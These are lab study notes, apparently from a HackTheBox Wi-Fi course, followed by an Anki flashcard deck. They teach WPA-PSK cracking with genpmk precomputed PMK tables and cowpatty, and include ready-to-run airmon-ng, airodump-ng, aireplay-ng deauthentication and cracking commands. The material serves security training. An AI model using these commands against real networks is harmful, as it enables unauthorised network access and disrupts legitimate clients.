# Chain #16: Precomputation (Rainbow Table) Attack

## Goal & Scope

Use precomputed PMKs (genpmk) to accelerate WPA‑PSK cracking against a known SSID by:

- Generating SSID‑specific PMK tables.
- Matching captured 4‑way handshakes against precomputed tables with cowpatty.
- Understanding trade‑offs: speed vs storage/target specificity.

---

## Concept (Short)

WPA‑PSK derives a PMK from the passphrase and SSID with PBKDF2. genpmk precomputes PMKs for many candidate passphrases _for a specific SSID_, producing a lookup file. cowpatty can match a captured 4‑way handshake to that precomputed table much faster than re‑deriving PBKDF2 for every candidate.

**When to use:**

- Target SSID is known and fixed (e.g., corporate SSID used by many APs).
- You will repeatedly test the same SSID (amortize generation cost).

**When not ideal:**

- You need to attack many different SSIDs (table per SSID → expensive).
- Storage or time to precompute is limited.

---

## Step 1 — Put Interface in Monitor Mode

Prepare wireless card for capture:

```bash
sudo airmon-ng start wlan0
```

- `airmon-ng` enables monitor mode (creates wlan0mon).
- If processes interfere, run `airmon-ng check kill`.

---

## Step 2 — Capture Handshake with airodump-ng

Scan and save capture (replace channel and ESSID accordingly):

```bash
airodump-ng wlan0mon -c 1 -w WPA --essid HackTheBox
```

- `-c 1`: lock to channel 1.
- `-w WPA`: write captures with prefix `WPA`.
- Watch `WPA-01.cap` for the `WPA handshake:` marker.

Force a reauthentication (optional) to trigger handshake:

```bash
aireplay-ng -0 5 -a <BSSID> -c <STATION> wlan0mon
```

- `-0 5`: send 5 deauths.
- `-a`: AP MAC (BSSID).
- `-c`: client MAC to direct deauth.

---

## Step 3 — Precompute PMKs with genpmk

Create the SSID‑specific PMK table from a wordlist:

```bash
genpmk -f /opt/rockyou.txt -d /tmp/hashtable -s HackTheBox
```

Flags explained:

- `-f /opt/rockyou.txt`: source wordlist of candidate passphrases.
- `-d /tmp/hashtable`: destination file to store precomputed PMKs.
- `-s HackTheBox`: SSID to tie the PMK generation to.

Notes:

- Generation is CPU/GPU intensive and can be long for large lists.
- Limit generation (e.g., 30k keys) to avoid huge storage in lab environments.

---

## Step 4 — Crack Using cowpatty Against Precomputed Table

Once you have a capture (`WPA-01.cap`) and `hashtable`, run cowpatty:

```bash
cowpatty -d /tmp/hashtable -r WPA-01.cap -s HackTheBox
```

Flags explained:

- `-d /tmp/hashtable`: use precomputed PMK file.
- `-r WPA-01.cap`: the capture file with 4‑way handshake.
- `-s HackTheBox`: the SSID (must match table).

If matched, cowpatty outputs the recovered PSK quickly because it avoids costly PBKDF2 recalculation.

---

## Step 5 — Example Full Flow (Quick)

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
airodump-ng wlan0mon -c 1 -w WPA --essid HackTheBox
# optionally: aireplay-ng -0 5 -a <BSSID> -c <CLIENT> wlan0mon
# generate table (on powerful/parallel host)
genpmk -f /opt/rockyou.txt -d /tmp/hashtable -s HackTheBox
# match handshake
cowpatty -d /tmp/hashtable -r WPA-01.cap -s HackTheBox
```

---

## Trade‑offs & Practical Notes

- **SSID specificity:** Each table only works for the SSID used during generation. If AP uses different SSID, regenerate.
- **Storage:** Large wordlists → very large hash tables. Plan disk space.
- **Time:** Generating tables is time‑consuming; only worth it when amortized over many handshakes for same SSID.
- **Alternatives:** Hashcat with hcxpcapngtool → use GPU for fast cracking without precomputing, more flexible across SSIDs.

---

## Checklist

-  Put interface into monitor mode.
-  Capture handshake (airodump-ng; deauth if needed).
-  Run genpmk with chosen wordlist and SSID.
-  Use cowpatty to test capture against generated table.
-  If unsuccessful, expand wordlist or use Hashcat methods.

---

## Anki Deck

```
#separator:tab
#html:true
#guid column:1
#notetype column:2
#deck column:3
#tags column:6

R1a4B7c9D2	Basic	Ops::WiFi Gym::Chain 16: Precomputation	What is the purpose of <code>genpmk</code> in WPA cracking?	To precompute PMKs (Pairwise Master Keys) for a specific SSID from a wordlist, enabling fast lookup during cracking.	wifi
S2b5C8d0E3	Basic (type in the answer)	Ops::WiFi Gym::Chain 16: Precomputation	Which <code>genpmk</code> command generates an SSID-specific PMK table from <code>/opt/rockyou.txt</code> for SSID <code>HackTheBox</code> and writes to <code>/tmp/hashtable</code>?	<code>genpmk -f /opt/rockyou.txt -d /tmp/hashtable -s HackTheBox</code>	wifi
T3c6D9e1F4	Basic	Ops::WiFi Gym::Chain 16: Precomputation	Why does <code>genpmk</code> need the SSID when generating PMKs?	Because WPA PBKDF2 derives PMKs from both passphrase and SSID; tables are SSID-dependent.	wifi
U4d7E0f2G5	Basic (type in the answer)	Ops::WiFi Gym::Chain 16: Precomputation	Which tool performs fast lookups against a <code>genpmk</code> table to recover a WPA PSK from a capture?	<code>cowpatty</code>	wifi
V5e8F1g3H6	Basic (type in the answer)	Ops::WiFi Gym::Chain 16: Precomputation	Show the exact <code>cowpatty</code> command that uses <code>/tmp/hashtable</code> and capture file <code>WPA-01.cap</code> for SSID <code>HackTheBox</code>.	<code>cowpatty -d /tmp/hashtable -r WPA-01.cap -s HackTheBox</code>	wifi
W6f9G2h4I7	Basic	Ops::WiFi Gym::Chain 16: Precomputation	What are the main drawbacks of precomputed PMK tables?	High storage needs, SSID specificity (table only works for that SSID), and time to generate tables.	wifi
X7g0H3i5J8	Basic	Ops::WiFi Gym::Chain 16: Precomputation	Why might precomputation be worth it despite costs?	If you will run many cracking attempts against the same SSID, the generation cost is amortized and lookups become very fast.	wifi
Y8h1I4j6K9	Basic (type in the answer)	Ops::WiFi Gym::Chain 16: Precomputation	Which <code>airmon-ng</code> command prepares <code>wlan0</code> for monitor-mode capture?	<code>sudo airmon-ng start wlan0</code>	wifi
Z9i2J5k7L0	Basic (type in the answer)	Ops::WiFi Gym::Chain 16: Precomputation	Which <code>airodump-ng</code> command saves a capture prefix <code>WPA</code> on channel <code>1</code> and filters for ESSID <code>HackTheBox</code> using monitor interface <code>wlan0mon</code>?	<code>sudo airodump-ng wlan0mon -c 1 -w WPA --essid HackTheBox</code>	wifi
A0j3K6l8M1	Basic (type in the answer)	Ops::WiFi Gym::Chain 16: Precomputation	Give the <code>aireplay-ng</code> command that sends 5 deauthentication frames to client <code>11:22:33:44:55:66</code> from AP <code>AA:BB:CC:DD:EE:FF</code> using interface <code>wlan0mon</code> to force a handshake.	<code>sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon</code>	wifi
B1k4L7m9N2	Basic	Ops::WiFi Gym::Chain 16: Precomputation	What practical limit was suggested for <code>genpmk</code> in lab environments to avoid excessive storage?	Generate up to ~30,000 keys (or otherwise cap generation) to avoid huge tables.	wifi
C2l5M8n0O3	Basic	Ops::WiFi Gym::Chain 16: Precomputation	If <code>genpmk</code> fails to crack, what are two sensible next steps?	Expand the wordlist used for <code>genpmk</code>, or switch to Hashcat with <code>hcxpcapngtool</code> for GPU cracking.	wifi
D3m6N9o1P4	Basic	Ops::WiFi Gym::Chain 16: Precomputation	Why does <code>cowpatty</code> run much faster with a <code>genpmk</code> table compared to a raw wordlist?	Because PMKs are precomputed so cowpatty does table lookups instead of performing PBKDF2 for every candidate.	wifi
E4n7O0p2Q5	Basic (type in the answer)	Ops::WiFi Gym::Chain 16: Precomputation	Which file does <code>airodump-ng</code> create on first run when using the <code>-w WPA</code> prefix?	<code>WPA-01.cap</code>	wifi
F5o8P1q3R6	Basic	Ops::WiFi Gym::Chain 16: Precomputation	What is the core cryptographic operation <code>genpmk</code> bypasses during <code>cowpatty</code> lookup?	PBKDF2-SHA1 (the expensive key derivation used to derive the PMK).	wifi
G6p9Q2r4S7	Basic	Ops::WiFi Gym::Chain 16: Precomputation	Name an alternative GPU-friendly approach that doesn't require SSID-specific tables.	Use Hashcat with <code>hcxpcapngtool</code> to create Hashcat-compatible hashes and crack with GPUs.	wifi
H7q0R3s5T8	Basic	Ops::WiFi Gym::Chain 16: Precomputation	What are the essential inputs <code>genpmk</code> requires?	A candidate wordlist (<code>-f</code>), an output destination (<code>-d</code>), and the target SSID (<code>-s</code>).	wifi
I8r1S4t6U9	Basic	Ops::WiFi Gym::Chain 16: Precomputation	Why should you run <code>genpmk</code> on a powerful host rather than the capture machine?	Table generation is CPU/GPU intensive and can overload small capture machines; better to offload to a dedicated cracking host.	wifi
J9s2T5u7V0	Basic	Ops::WiFi Gym::Chain 16: Precomputation	Summarize in one line when precomputation is the best strategy.	When you have a known SSID and will test many passphrases repeatedly against it, precompute PMKs to speed cracking.	wifi
```